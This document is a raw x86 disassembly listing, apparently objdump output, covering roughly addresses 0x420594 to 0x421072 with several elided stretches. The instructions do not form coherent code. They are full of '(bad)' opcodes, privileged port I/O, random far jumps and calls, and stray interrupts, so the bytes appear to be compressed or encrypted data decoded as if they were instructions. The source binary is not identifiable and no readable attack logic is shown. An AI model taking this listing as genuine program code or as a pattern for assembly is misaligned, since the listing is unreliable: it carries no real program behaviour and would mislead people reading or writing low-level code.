  420594:	mov    edi,edi
  420596:	and    al,0x61
  420598:	sub    ch,dl
  42059a:	push   esi
  42059b:	push   ds
  42059c:	retf   
  42059d:	lock test al,0x4a
  4205a0:	jno    0x420532
  4205a2:	ss enter 0x8097,0xfd
  4205a7:	jle    0x4205d1
  4205a9:	inc    ecx
  4205aa:	(bad)  
  4205ab:	sub    esi,ecx
  4205ad:	in     al,0x65
  4205af:	out    dx,eax
  4205b0:	je     0x4205a5
  4205b2:	and    DWORD PTR [eax-0xa],0xffffffb6
  4205b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4205b7:	pop    edi
  4205b8:	jno    0x420622
  4205ba:	or     al,0xf8
  4205bc:	xchg   edi,eax
  4205bd:	js     0x4205b5
  4205bf:	and    dh,BYTE PTR [esi+esi*2+0x6b]
  4205c3:	leave  
  4205c4:	dec    ebp
  4205c5:	sahf   
  4205c6:	mov    WORD PTR [edi+edi*8],cs
  4205c9:	fist   DWORD PTR [ebp+0x3786e35f]
  4205cf:	push   ebp
  4205d0:	xor    eax,0xf374a33b
  4205d5:	stos   BYTE PTR es:[edi],al
  4205d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205d7:	es push ebp
  4205d9:	push   ecx
  4205da:	mov    al,0xdb
  4205dc:	sar    DWORD PTR [edi],1
  4205de:	mov    ds:0xed599cba,al
  4205e3:	dec    ecx
  4205e4:	sub    eax,0x65536a22
  4205e9:	js     0x420623
  4205eb:	add    DWORD PTR [edx],edx
  4205ed:	xchg   edx,eax
  4205ee:	adc    esp,ebx
  4205f0:	mov    ss,WORD PTR [edi-0xc108c53]
  4205f6:	cdq    
  4205f7:	adc    al,0x19
  4205f9:	pop    esi
  4205fa:	pop    esp
  4205fb:	mov    dl,0x51
  4205fd:	pop    ss
  4205fe:	mov    dl,0x92
  420600:	dec    edi
  420601:	cmp    eax,0x637ac39c
  420606:	fs out dx,al
  420608:	mov    edi,0x750c0ce7
  42060d:	mov    ds:0x9e8d01f1,eax
  420612:	leave  
  420613:	pop    esi
  420614:	fisubr WORD PTR [esi-0x8]
  420617:	pop    es
  420618:	sbb    bl,BYTE PTR [ebp+0x67]
  42061b:	pop    eax
  42061c:	pop    edx
  42061d:	loop   0x42059f
  42061f:	ror    edi,1
  420621:	loop   0x42063c
  420623:	fisub  DWORD PTR [eax-0x3a]
  420626:	xor    ecx,edx
  420628:	div    edx
  42062a:	leave  
  42062b:	mov    DWORD PTR [eax],esi
  42062d:	xor    eax,DWORD PTR [edi]
  42062f:	jmp    0xbd1c:0x954f9530
  420636:	adc    dl,BYTE PTR [edi+edx*8+0x6c]
  42063a:	dec    ecx
  42063b:	push   ebp
  42063c:	sbb    dh,BYTE PTR [edi]
  42063e:	mov    al,ds:0x7660
	...
  4206b3:	add    BYTE PTR [edx-0x5081dcc4],dl
  4206b9:	jg     0x42069a
  4206bb:	cld    
  4206bc:	jo     0x4206a6
  4206be:	hlt    
  4206bf:	leave  
  4206c0:	sbb    BYTE PTR [eax+esi*4-0x2c],0x43
  4206c5:	pop    ebx
  4206c6:	add    DWORD PTR [eax],eax
  4206c8:	cmc    
  4206c9:	add    BYTE PTR [eax],al
  4206cb:	add    BYTE PTR [eax+0x25],cl
  4206ce:	(bad)  
  4206cf:	dec    esi
  4206d0:	dec    ebp
  4206d1:	mov    eax,0x299e8b88
  4206d6:	repnz scas eax,DWORD PTR es:[edi]
  4206d8:	test   eax,0x11554cc6
  4206dd:	dec    edx
  4206de:	repnz cs mov ch,0x18
  4206e2:	xor    BYTE PTR [edi+0x65f81822],0x6d
  4206e9:	xlat   BYTE PTR ds:[ebx]
  4206ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206eb:	test   al,0x4a
  4206ed:	out    dx,eax
  4206ee:	jecxz  0x420741
  4206f0:	ret    
  4206f1:	stos   BYTE PTR es:[edi],al
  4206f2:	dec    ebx
  4206f3:	push   ebx
  4206f4:	jmp    0x4724cb58
  4206f9:	aam    0xaf
  4206fb:	push   ebp
  4206fc:	sub    DWORD PTR [esi-0x570154be],edx
  420702:	xor    DWORD PTR [ecx-0x6acbf885],ecx
  420708:	or     BYTE PTR [edx+0x44],0x6f
  42070c:	adc    al,0xcd
  42070e:	cmp    eax,0x870aee25
  420713:	or     cl,BYTE PTR [ebx-0x5a]
  420716:	mov    eax,0x4a31b2c1
  42071b:	les    edi,FWORD PTR [ebp+0x4a]
  42071e:	clc    
  42071f:	xchg   esi,eax
  420720:	sbb    ecx,esi
  420722:	fidiv  DWORD PTR [ecx-0xf]
  420725:	popf   
  420726:	xchg   esp,eax
  420727:	xor    eax,0xbbe43a4c
  42072c:	mov    edi,fs
  42072e:	mov    ebp,0xcacd0f0d
  420733:	out    dx,eax
  420734:	sub    BYTE PTR [ebx+0x3add8e2e],ah
  42073a:	xlat   BYTE PTR ds:[ebx]
  42073b:	sub    ch,BYTE PTR [eax-0x5a0ce0c4]
  420741:	adc    WORD PTR [eax],dx
  420744:	sub    al,0xe4
  420746:	push   esp
  420747:	fmul   st,st(4)
  420749:	pushf  
  42074a:	ror    ebp,cl
  42074c:	xor    al,0xa0
  42074e:	xor    eax,0x95fd9a29
  420753:	cmp    DWORD PTR [edi*2-0x64c2e06a],esi
  42075a:	sub    BYTE PTR [ebp-0x60bf7f44],al
  420760:	test   DWORD PTR [ebx-0x2],ecx
  420763:	sub    cl,BYTE PTR [esi-0x33]
  420766:	sbb    BYTE PTR [ebp+0x12],ah
  420769:	stc    
  42076a:	popf   
  42076b:	ss mov ebx,0x8eb16ce6
  420771:	push   esp
  420772:	push   edx
  420773:	xor    BYTE PTR [ecx+eiz*4],dl
  420776:	mov    eax,ds:0x5f0e09bf
  42077b:	add    al,0x4
  42077d:	aad    0xcf
  42077f:	xchg   edx,eax
  420780:	sti    
  420781:	lahf   
  420782:	or     cl,BYTE PTR [ebp+esi*1+0x1156be26]
  420789:	int    0x58
  42078b:	dec    BYTE PTR [eax-0x1fd886ad]
  420791:	adc    esp,ebx
  420793:	cmp    dh,dl
  420795:	scas   eax,DWORD PTR es:[edi]
  420796:	aaa    
  420797:	jb     0xdfd31621
  42079d:	lahf   
  42079e:	call   0x144c106d
  4207a3:	outs   dx,BYTE PTR ds:[esi]
  4207a4:	fst    QWORD PTR [esi-0x417b65fc]
  4207aa:	pop    es
  4207ab:	cmc    
  4207ac:	ja     0x4207f4
  4207ae:	xchg   BYTE PTR [esp+ecx*2-0x6],cl
  4207b2:	inc    ebp
  4207b3:	ret    
  4207b4:	push   0x272afd1a
  4207b9:	cli    
  4207ba:	dec    ebx
  4207bb:	xchg   ebx,eax
  4207bc:	in     al,0xfe
  4207be:	sbb    eax,ecx
  4207c0:	pop    ss
	...
  420831:	add    BYTE PTR [eax],al
  420833:	add    BYTE PTR [ecx+0x3b920b9a],ah
  420839:	xchg   ebx,eax
  42083a:	mov    ecx,0xafa823bb
  42083f:	mov    bh,0x18
  420841:	(bad)  
  420843:	push   edi
  420844:	cmp    BYTE PTR [ecx+eax*1+0x0],bl
  420848:	cmc    
  420849:	add    BYTE PTR [eax],al
  42084b:	add    ah,bh
  42084d:	cmp    bl,BYTE PTR [esi+eax*8]
  420850:	adc    dl,ah
  420852:	pop    ds
  420853:	push   ebx
  420854:	call   0xfbc6:0xb4505c60
  42085b:	(bad)  
  42085c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42085d:	pop    ebx
  42085e:	(bad)  
  42085f:	stc    
  420860:	out    0x9f,eax
  420862:	sub    esp,DWORD PTR ds:0xe5008aec
  420868:	inc    eax
  420869:	xchg   ecx,eax
  42086a:	scas   eax,DWORD PTR es:[edi]
  42086b:	adc    eax,0x45bd614a
  420870:	mov    ds:0x404713f7,al
  420875:	iret   
  420876:	loop   0x4208c5
  420878:	scas   eax,DWORD PTR es:[edi]
  420879:	add    dh,ch
  42087b:	push   ecx
  42087c:	xor    ebx,DWORD PTR [edx+edi*1]
  42087f:	mov    bh,0xcc
  420881:	sbb    cl,BYTE PTR ds:0xc188710b
  420887:	inc    edx
  420888:	mov    al,ds:0xea05c4b4
  42088d:	fs push es
  42088f:	daa    
  420890:	adc    al,BYTE PTR [eax]
  420892:	sub    ecx,esp
  420894:	lods   al,BYTE PTR ds:[esi]
  420895:	mov    cs,WORD PTR [esi+0x12]
  420898:	dec    ecx
  420899:	add    DWORD PTR [eax+edx*8],ecx
  42089c:	retf   
  42089d:	imul   DWORD PTR [edi-0x406c933a]
  4208a3:	or     eax,0x4c03fc4d
  4208a8:	aam    0xbe
  4208aa:	stc    
  4208ab:	or     DWORD PTR [edi+0x177d5453],0xffffff8c
  4208b2:	mov    ecx,0x27c4f0fc
  4208b7:	fisubr DWORD PTR [ebx-0x2d4a881c]
  4208bd:	and    al,0xe0
  4208bf:	fst    QWORD PTR [edi]
  4208c1:	dec    ebp
  4208c2:	xchg   edi,eax
  4208c3:	and    eax,0xad7ebab9
  4208c8:	loopne 0x4208cb
  4208ca:	stos   DWORD PTR es:[edi],eax
  4208cb:	icebp  
  4208cc:	push   eax
  4208cd:	call   0x77b0:0x3e165003
  4208d4:	sub    ebx,ebx
  4208d6:	push   eax
  4208d7:	into   
  4208d8:	loop   0x420906
  4208da:	in     al,dx
  4208db:	jmp    0x2b65:0x41c43baf
  4208e2:	aam    0x23
  4208e4:	icebp  
  4208e5:	fcomp  QWORD PTR [ebp-0x42c91a3e]
  4208eb:	xlat   BYTE PTR ds:[ebx]
  4208ec:	or     eax,0x677b88b2
  4208f1:	push   ebx
  4208f2:	lds    ebx,FWORD PTR [edx+0x2a]
  4208f5:	ror    DWORD PTR [edx],1
  4208f7:	mov    ebx,0xef05451f
  4208fc:	out    0x39,eax
  4208fe:	into   
  4208ff:	pop    ebp
  420900:	xchg   edx,eax
  420901:	js     0x42088e
  420903:	neg    DWORD PTR [esi]
  420905:	(bad)  
  420906:	and    al,0x67
  420908:	jae    0x42090c
  42090a:	int    0xbf
  42090c:	inc    ecx
  42090d:	pop    ebx
  42090e:	push   esi
  42090f:	mov    dh,0x65
  420911:	push   ds
  420912:	mov    WORD PTR [eax+0x52cbea61],ss
  420918:	push   ss
  420919:	fld    DWORD PTR [edi-0x1f]
  42091c:	or     al,0x55
  42091e:	inc    edi
  42091f:	out    dx,eax
  420920:	enter  0xea86,0xf7
  420924:	call   0xc9cb:0xbdd21b74
  42092b:	das    
  42092c:	pop    ss
  42092d:	sbb    cl,0xc1
  420930:	pop    eax
  420931:	sbb    bh,BYTE PTR [edi+0x4846ddc3]
  420937:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420938:	push   cs
  420939:	int    0x43
  42093b:	mov    cl,BYTE PTR [edx]
  42093d:	stos   BYTE PTR es:[edi],al
  42093e:	add    bl,BYTE PTR [ecx-0x5d]
	...
  4209b1:	add    BYTE PTR [eax],al
  4209b3:	add    BYTE PTR [edx],cl
  4209b5:	inc    ecx
  4209b6:	mov    bh,0xa1
  4209b8:	push   edi
  4209ba:	push   ds
  4209bb:	jmp    0x42097d
  4209bd:	sahf   
  4209be:	fisub  WORD PTR [esi-0x57]
  4209c1:	fimul  WORD PTR [ebp+edx*8+0x15d2d]
  4209c8:	cmc    
  4209c9:	add    BYTE PTR [eax],al
  4209cb:	add    BYTE PTR [ebx+0x5f],bh
  4209ce:	dec    esi
  4209cf:	mov    ds:0xaa898a34,eax
  4209d4:	sub    eax,0xe65b73c1
  4209d9:	add    edx,ebx
  4209db:	xchg   DWORD PTR [edx+0x34],esi
  4209de:	push   esp
  4209df:	(bad)  
  4209e0:	mov    ebx,0xe58356a6
  4209e5:	pop    ebx
  4209e6:	ds lahf 
  4209e8:	cs ins BYTE PTR es:[edi],dx
  4209ea:	es in  al,0x45
  4209ed:	xchg   ecx,eax
  4209ee:	inc    edx
  4209ef:	and    bh,al
  4209f1:	push   esp
  4209f2:	xor    DWORD PTR [edi+0x7ec8e86],eax
  4209f8:	gs cwde 
  4209fa:	or     al,BYTE PTR [ecx-0x7c]
  4209fd:	inc    ebp
  4209fe:	test   al,0x5c
  420a00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a01:	leave  
  420a02:	pusha  
  420a03:	cmp    DWORD PTR ss:[eax+0x27],ebx
  420a07:	mov    al,ds:0xac629ecc
  420a0c:	ja     0x4209be
  420a0e:	not    BYTE PTR [esi]
  420a10:	add    BYTE PTR [edx+0x49],cl
  420a13:	inc    edi
  420a14:	call   0x7f6:0xcafbff3
  420a1b:	mov    bh,0x52
  420a1d:	or     DWORD PTR [ecx+eiz*4-0x60],ecx
  420a21:	fnstcw WORD PTR [ebx-0x51860e47]
  420a27:	add    al,0x1a
  420a29:	sbb    eax,0xec9117c7
  420a2e:	xlat   BYTE PTR ds:[ebx]
  420a2f:	sahf   
  420a30:	js     0x420a77
  420a32:	int    0xf6
  420a34:	xchg   ecx,eax
  420a35:	pusha  
  420a36:	mov    eax,ebx
  420a38:	xor    eax,0x70804cf5
  420a3d:	enter  0x165d,0x12
  420a41:	or     bh,al
  420a43:	pop    edi
  420a44:	mov    ebp,0x9540a159
  420a49:	imul   ebx,ebp,0x87960cef
  420a4f:	les    edi,FWORD PTR [ebx+0x7ba92383]
  420a55:	sub    al,BYTE PTR [edx-0x4a]
  420a58:	pop    eax
  420a59:	cdq    
  420a5a:	div    BYTE PTR [esp+esi*8+0x655a723]
  420a61:	push   0x4cd73149
  420a66:	popf   
  420a67:	out    dx,eax
  420a68:	stos   DWORD PTR es:[edi],eax
  420a69:	and    esp,DWORD PTR [edx+0x7]
  420a6c:	rcl    cl,cl
  420a6e:	je     0x420a29
  420a70:	mov    edi,0x65c17399
  420a75:	push   edx
  420a76:	ficomp WORD PTR [edx+ebx*2]
  420a79:	adc    DWORD PTR [eax+0x6e],0xd05c20be
  420a80:	add    al,0x5e
  420a82:	mov    ch,0xd4
  420a84:	fld    TBYTE PTR [ebp+0x6fd159db]
  420a8a:	sbb    BYTE PTR [ecx],ah
  420a8c:	sbb    bh,cl
  420a8e:	test   eax,0xf561a118
  420a93:	loopne 0x420a1f
  420a95:	stos   BYTE PTR es:[edi],al
  420a96:	jns    0x420ace
  420a98:	xchg   esp,eax
  420a99:	lock pop ecx
  420a9b:	stc    
  420a9c:	push   esp
  420a9d:	inc    ecx
  420a9e:	mov    ds:0xf857a5fc,eax
  420aa3:	scas   al,BYTE PTR es:[edi]
  420aa4:	comiss xmm4,DWORD PTR [edi]
  420aa7:	popf   
  420aa8:	mov    cl,0xbc
  420aaa:	pop    ecx
  420aab:	ins    DWORD PTR es:[edi],dx
  420aac:	iret   
  420aad:	aam    0x5e
  420aaf:	xchg   edx,eax
  420ab0:	push   ecx
  420ab1:	retf   
  420ab2:	sbb    eax,0xd4823de7
  420ab7:	aad    0x10
  420ab9:	in     eax,0x25
  420abb:	popa   
  420abc:	jnp    0x420aff
  420abe:	aaa    
  420abf:	add    BYTE PTR [edi+0x0],dh
	...
  420b31:	add    BYTE PTR [eax],al
  420b33:	add    ah,bl
  420b35:	sub    BYTE PTR [edx-0x119011c],cl
  420b3b:	cmp    BYTE PTR [edi+0x39],dl
  420b3e:	dec    edx
  420b3f:	setae  BYTE PTR [edi-0x18]
  420b43:	push   edi
  420b44:	and    bl,BYTE PTR [esi+0x1]
  420b47:	add    ch,dh
  420b49:	add    BYTE PTR [eax],al
  420b4b:	add    BYTE PTR ds:0x17c3ddb7,ah
  420b51:	sbb    dl,BYTE PTR [ecx+0x62]
  420b54:	dec    edi
  420b55:	loope  0x420bc7
  420b57:	repnz (bad) [ebx]
  420b5a:	sub    cl,BYTE PTR ds:0x6adb1cfd
  420b60:	sbb    BYTE PTR [ebp-0x40aaacfc],ah
  420b66:	scas   al,BYTE PTR es:[edi]
  420b67:	(bad)  
  420b68:	les    edi,FWORD PTR [edi-0x775570e3]
  420b6e:	inc    edi
  420b6f:	jl     0x420b35
  420b71:	or     cl,ch
  420b73:	pop    ss
  420b74:	aaa    
  420b75:	fwait
  420b76:	addr16 mov bl,0x42
  420b79:	mov    bl,0x24
  420b7b:	repz xor BYTE PTR [edi-0x67],0x5d
  420b80:	jmp    0xb291:0xc83bd3d9
  420b87:	and    DWORD PTR [edi+eiz*2],0x8077348
  420b8e:	lods   eax,DWORD PTR ds:[esi]
  420b8f:	mov    ecx,0x76c3a72c
  420b94:	jmp    FWORD PTR [edx-0x4151159]
  420b9a:	enter  0x68f4,0xf4
  420b9e:	pop    edi
  420b9f:	cmc    
  420ba0:	add    DWORD PTR [edi+edx*1-0x173b5ada],eax
  420ba7:	sbb    edi,DWORD PTR [ebp+0x3424b5a9]
  420bad:	xor    ah,dh
  420baf:	add    dh,cl
  420bb1:	and    esp,DWORD PTR [ebp-0x55c0a6fb]
  420bb7:	aam    0x9e
  420bb9:	scas   al,BYTE PTR es:[edi]
  420bba:	sbb    eax,0x371a508d
  420bbf:	or     eax,0xb2165a6d
  420bc4:	xchg   ecx,eax
  420bc5:	push   0x40
  420bc7:	adc    al,0xc2
  420bca:	cdq    
  420bcb:	mov    cl,0x37
  420bcd:	pop    ds
  420bce:	ret    
  420bcf:	adc    ah,BYTE PTR [esi]
  420bd1:	jecxz  0x420bab
  420bd3:	frstor [eax+ebx*2+0x25]
  420bd7:	sbb    ebp,0x67
  420bda:	and    eax,0x2e6435e5
  420bdf:	jno    0x420b98
  420be1:	gs (bad) 
  420be3:	pop    eax
  420be4:	in     eax,dx
  420be5:	inc    ebp
  420be6:	push   es
  420be7:	push   ecx
  420be8:	mov    ecx,0xd983a294
  420bed:	jp     0x420c3b
  420bef:	jle    0x420be1
  420bf1:	or     eax,0x497ae594
  420bf6:	test   eax,0xff3168c0
  420bfb:	mov    edi,0x548f6505
  420c00:	in     eax,0x19
  420c02:	lods   eax,DWORD PTR ds:[esi]
  420c03:	adc    al,0xaf
  420c05:	out    0x5,eax
  420c07:	stc    
  420c08:	inc    edi
  420c09:	call   0x87e:0x65a36cd
  420c10:	xchg   esp,eax
  420c11:	call   0xbb2ab040
  420c16:	in     eax,dx
  420c17:	test   eax,0xb0f5b4c
  420c1c:	sahf   
  420c1d:	add    ebx,DWORD PTR [edx+0x40]
  420c20:	pop    edx
  420c21:	jb     0x420ca1
  420c23:	jmp    0x566a:0xe3c4ae94
  420c2a:	jp     0x420bff
  420c2c:	and    ebp,DWORD PTR [eax]
  420c2e:	loopne 0x420c07
  420c30:	outs   dx,DWORD PTR ds:[esi]
  420c31:	popf   
  420c32:	sub    BYTE PTR [ecx],ah
  420c34:	mov    edx,0xd6b2a462
  420c39:	jg     0x420c64
  420c3b:	(bad)  
  420c3c:	or     ecx,edi
  420c3e:	push   esi
  420c3f:	xor    ebp,DWORD PTR [esi+0x0]
	...
  420cb2:	add    BYTE PTR [eax],al
  420cb4:	or     al,0x6a
  420cb6:	push   edx
  420cb7:	shl    DWORD PTR [esi-0x7],0x9f
  420cbb:	out    dx,eax
  420cbc:	xchg   ecx,eax
  420cbd:	inc    ecx
  420cbe:	push   0xa975825f
  420cc3:	(bad)  
  420cc4:	pop    ss
  420cc5:	pop    edi
  420cc6:	add    DWORD PTR [eax],eax
  420cc8:	cmc    
  420cc9:	add    BYTE PTR [eax],al
  420ccb:	add    dl,dh
  420ccd:	xor    DWORD PTR [edx+0x59864720],0x5b
  420cd4:	loop   0x420c6d
  420cd6:	jp     0x420cc5
  420cd8:	es sbb al,0x34
  420cdb:	ins    BYTE PTR es:[edi],dx
  420cdc:	leave  
  420cdd:	cmp    BYTE PTR [eax+edx*4+0x46],al
  420ce1:	pop    esi
  420ce2:	into   
  420ce3:	(bad)  
  420ce4:	clc    
  420ce5:	neg    BYTE PTR [ecx+0x7d616542]
  420ceb:	mov    esp,0x6df21c40
  420cf0:	push   ebp
  420cf1:	sub    eax,0xba2634fe
  420cf6:	(bad)  
  420cf7:	rol    BYTE PTR [ebx+0x26],1
  420cfa:	ss rcl dh,cl
  420cfd:	inc    ch
  420cff:	add    ah,ch
  420d01:	cwde   
  420d02:	mov    eax,0x814204f8
  420d07:	push   ebx
  420d08:	jmp    0x392753a8
  420d0d:	call   0x2cc8:0x4f0f5b0
  420d14:	jns    0x420cad
  420d16:	add    eax,0xdbbc8a83
  420d1b:	add    ecx,edx
  420d1d:	jae    0x420ce3
  420d1f:	cli    
  420d20:	lock sbb eax,0x89deb904
  420d26:	(bad)  
  420d27:	in     al,dx
  420d28:	dec    ebp
  420d29:	push   ecx
  420d2a:	xchg   DWORD PTR [ebx],esp
  420d2c:	jnp    0x420d7b
  420d2e:	pop    edi
  420d2f:	mov    ebp,0x2e3dfb14
  420d34:	repz fwait
  420d36:	xchg   edi,eax
  420d37:	and    BYTE PTR [ebx],0x0
  420d3a:	fist   WORD PTR [ebx-0x56fd472a]
  420d40:	stos   DWORD PTR es:[edi],eax
  420d41:	mov    DWORD PTR [ecx],ebx
  420d43:	pop    ebp
  420d44:	(bad)  
  420d46:	ins    BYTE PTR es:[edi],dx
  420d47:	mov    dh,BYTE PTR [ebx]
  420d49:	in     eax,dx
  420d4a:	call   0x8935bb6a
  420d4f:	call   0x44:0xe260eeff
  420d56:	xchg   esp,eax
  420d57:	gs pop ss
  420d59:	mov    dl,0xbd
  420d5b:	pop    esi
  420d5c:	or     al,0x44
  420d5e:	into   
  420d5f:	mov    dh,0x2e
  420d61:	push   esi
  420d62:	sahf   
  420d63:	pop    ds
  420d64:	ds pop ecx
  420d66:	jns    0x420db1
  420d68:	sub    ah,BYTE PTR [eax+0x1a]
  420d6b:	mov    esi,0xedfa8e88
  420d70:	test   DWORD PTR [eax+esi*1],esp
  420d73:	scas   eax,DWORD PTR es:[edi]
  420d74:	(bad)  
  420d75:	in     al,0x5e
  420d77:	add    al,0x87
  420d79:	icebp  
  420d7a:	fwait
  420d7b:	ror    BYTE PTR [edi],1
  420d7d:	(bad)  
  420d7e:	dec    edx
  420d7f:	hlt    
  420d80:	add    DWORD PTR [esi+0x6b],esi
  420d83:	cmp    edi,DWORD PTR ds:0xcd866992
  420d89:	cmp    al,0xb4
  420d8b:	pop    edi
  420d8c:	data16 or ch,BYTE PTR [edi+0x8fd3303]
  420d93:	jg     0x420d48
  420d95:	inc    ebx
  420d96:	aas    
  420d97:	imul   ecx,DWORD PTR [edx],0xffffffa0
  420d9a:	mov    edx,0xb87dd3a0
  420d9f:	mov    al,0x83
  420da1:	pop    eax
  420da2:	cmp    al,0x19
  420da4:	xor    cl,bh
  420da6:	and    eax,0x73b08ac5
  420dab:	sub    al,0x30
  420dad:	sbb    BYTE PTR [ecx],al
  420daf:	out    dx,al
  420db0:	jl     0x420d5b
  420db2:	mov    esi,0x94a3b30e
  420db7:	push   eax
  420db8:	mov    dx,0x1356
  420dbc:	xor    DWORD PTR [ecx+0x53db6e],edx
	...
  420e32:	add    BYTE PTR [eax],al
  420e34:	stos   BYTE PTR es:[edi],al
  420e35:	push   ebp
  420e36:	call   0x645d:0xffefffe7
  420e3d:	inc    ebx
  420e3e:	and    edx,ecx
  420e40:	out    dx,al
  420e41:	(bad)  
  420e42:	loop   0x420e16
  420e44:	or     al,0x60
  420e46:	add    DWORD PTR [eax],eax
  420e48:	cmc    
  420e49:	add    BYTE PTR [eax],al
  420e4b:	add    BYTE PTR [edx],ch
  420e4d:	inc    esi
  420e4e:	and    eax,0xc5878035
  420e53:	mul    BYTE PTR [ebx+0x5f]
  420e56:	mov    WORD PTR [ebp-0xcf6da2f],ds
  420e5c:	sbb    BYTE PTR [edi],0x70
  420e5f:	lea    ebp,[edi-0x2e101a36]
  420e65:	mov    eax,0x622ea3b
  420e6a:	sub    DWORD PTR cs:[ecx],edx
  420e6d:	and    DWORD PTR [ebp-0x29],ecx
  420e70:	ins    DWORD PTR es:[edi],dx
  420e71:	icebp  
  420e72:	imul   ecx,DWORD PTR [edi],0xd0fdc26a
  420e78:	sub    ecx,ecx
  420e7a:	mov    dh,0x8d
  420e7c:	popf   
  420e7d:	jne    0x420e1e
  420e7f:	jne    0x420ee8
  420e81:	int    0x2d
  420e83:	or     DWORD PTR [esi+0x2089d6ec],eax
  420e89:	(bad)  
  420e8a:	fadd   DWORD PTR [esi+0x19df1960]
  420e90:	shl    BYTE PTR [edi+0x4d],cl
  420e93:	iret   
  420e94:	pop    ebp
  420e95:	mov    eax,ds:0xd2d509d5
  420e9a:	ds stos DWORD PTR es:[edi],eax
  420e9c:	mov    ebp,0x1db2fb83
  420ea1:	pop    es
  420ea2:	add    esp,DWORD PTR [eax]
  420ea4:	mov    BYTE PTR [ecx-0x54],dh
  420ea7:	mov    al,BYTE PTR [ecx+esi*2]
  420eaa:	cmc    
  420eab:	mov    eax,0xef276dc5
  420eb0:	jb     0x420e5c
  420eb2:	dec    ebx
  420eb3:	xchg   BYTE PTR [edi+esi*4],dh
  420eb6:	adc    BYTE PTR [edi],bl
  420eb8:	stos   DWORD PTR es:[edi],eax
  420eb9:	(bad)  
  420ebb:	cmp    edx,DWORD PTR es:[ecx-0x52]
  420ebf:	mov    eax,ds:0xc16c3f63
  420ec4:	pop    esp
  420ec5:	jmp    0x420ecb
  420ec7:	jle    0x420e66
  420ec9:	data16 sbb al,al
  420ecc:	test   al,0x25
  420ece:	xor    DWORD PTR [edx+0x77],eax
  420ed1:	test   DWORD PTR [eax],eax
  420ed3:	dec    esp
  420ed5:	jns    0x420f04
  420ed7:	pop    eax
  420ed8:	popf   
  420ed9:	mov    al,ds:0xb9b1e5b6
  420ede:	jnp    0x420eba
  420ee0:	jb     0x420f11
  420ee2:	push   0xe17ad4c4
  420ee7:	cli    
  420ee8:	xchg   BYTE PTR [eax],cl
  420eea:	jae    0x420ef5
  420eec:	mov    dh,0x2d
  420eee:	xor    DWORD PTR [ecx],0x1cfd72aa
  420ef4:	adc    eax,0x847946e1
  420ef9:	arpl   WORD PTR ds:0x5d37eeb5,bp
  420eff:	xchg   ebp,eax
  420f00:	fcomp  QWORD PTR [edi-0x1632680c]
  420f06:	and    eax,DWORD PTR [ebx]
  420f08:	retf   0x45d4
  420f0b:	jmp    0x420ea0
  420f0d:	sub    ebp,ebp
  420f0f:	fs mov ebx,0x9c864e14
  420f15:	shr    ecx,0xc7
  420f18:	aas    
  420f19:	cdq    
  420f1a:	out    dx,eax
  420f1b:	ds sbb al,dl
  420f1e:	or     eax,0xa71ae7d4
  420f23:	cmp    bh,bh
  420f25:	shl    dh,cl
  420f27:	xor    ebp,0x97bb3315
  420f2d:	mov    esi,0x1ce12e21
  420f32:	push   edi
  420f33:	pop    edx
  420f34:	mov    edx,0x3ff40bd3
  420f39:	cld    
  420f3a:	clc    
  420f3b:	aaa    
  420f3c:	and    bh,ch
  420f3e:	addr16 jg 0x420f96
	...
  420fb1:	add    BYTE PTR [eax],al
  420fb3:	add    BYTE PTR [edx-0x5b],ah
  420fb6:	jbe    0x421037
  420fb8:	idiv   edi
  420fba:	imul   edi,DWORD PTR [ebp-0x6d53d0f4],0x45
  420fc1:	jg     0x420fe7
  420fc3:	xor    BYTE PTR [ecx],al
  420fc5:	popa   
  420fc6:	add    DWORD PTR [eax],eax
  420fc8:	cmc    
  420fc9:	add    BYTE PTR [eax],al
  420fcb:	add    BYTE PTR [edi],cl
  420fcd:	mov    dh,0xfb
  420fcf:	repz call 0xf771:0xb4332d37
  420fd7:	inc    ebp
  420fd8:	xor    eax,0x5bd8f8d
  420fdd:	scas   eax,DWORD PTR es:[edi]
  420fde:	mov    ebx,0x86d9a7b9
  420fe3:	pop    eax
  420fe4:	ret    
  420fe5:	add    DWORD PTR [eax+0x59],ebx
  420fe8:	and    eax,0xdcae3ae2
  420fed:	ud1    edx,DWORD PTR [ebx-0x39]
  420ff1:	test   bl,dh
  420ff3:	pop    edx
  420ff4:	ret    0x8992
  420ff7:	std    
  420ff8:	fisttp DWORD PTR [edx]
  420ffa:	jge    0x421026
  420ffc:	call   0xf217b178
  421001:	jg     0x420fe3
  421003:	rol    DWORD PTR [edi],cl
  421005:	mov    bl,0xbd
  421007:	cli    
  421008:	push   ds
  421009:	aaa    
  42100a:	lods   al,BYTE PTR ds:[esi]
  42100b:	or     eax,0x84e647fe
  421010:	mov    ebp,DWORD PTR [esi+0x27]
  421013:	fistp  QWORD PTR [ebp+0x5457b0c]
  421019:	mov    ch,BYTE PTR [edx]
  42101b:	push   eax
  42101c:	(bad)  
  42101d:	jnp    0x420ffb
  42101f:	ins    DWORD PTR es:[edi],dx
  421020:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421021:	imul   edx,DWORD PTR [ebp+0x3],0xd2d1175d
  421028:	sub    DWORD PTR [ebx+0x6f],0xffffffc5
  42102c:	mov    dl,0x4e
  42102e:	xor    edx,edi
  421030:	jg     0x421075
  421032:	adc    esi,ecx
  421034:	xor    dl,BYTE PTR [edi]
  421036:	xchg   esp,eax
  421037:	add    BYTE PTR [esp+esi*8-0x2990dc53],0xfb
  42103f:	outs   dx,DWORD PTR ds:[esi]
  421040:	es dec ecx
  421042:	outs   dx,BYTE PTR ds:[esi]
  421043:	(bad)  
  421044:	jo     0x42107b
  421046:	dec    esp
  421047:	fild   DWORD PTR [esi-0x7b]
  42104a:	dec    edi
  42104b:	or     eax,0x68db9729
  421050:	call   0x4b4d32f8
  421055:	fldenv [edi]
  421057:	xchg   esp,eax
  421058:	cmp    al,0xc1
  42105a:	dec    edi
  42105b:	enter  0x9d29,0x60
  42105f:	dec    ecx
  421060:	jecxz  0x421096
  421062:	arpl   WORD PTR [ecx-0x24],sp
  421065:	test   eax,0xcbe9628e
  42106a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42106b:	sbb    DWORD PTR [eax+0x2fdf7c27],ecx
  421071:	pop    es
  421072:	push   esi
